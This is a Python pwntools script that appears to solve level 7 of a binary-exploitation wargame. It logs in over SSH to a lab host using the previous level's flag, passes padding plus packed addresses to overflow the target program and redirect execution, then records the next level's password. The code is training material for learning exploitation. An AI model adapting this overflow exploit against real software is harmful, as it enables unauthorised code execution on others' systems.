#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'level7'
password = open("../level6/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:

    arg1 = b"a" * 20 + p32(0x08049928)
    arg2 = p32(0x080484f4)

    p = s.process(["./level7", arg1, arg2])

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0) -> str:
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ ":
                break
    
    try:
        
        flag = ssh_recv().split('\n')[0]
    
    except ValueError:
        exit(1)

    print(f"\nlevel8 password: {flag}\n")

    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()

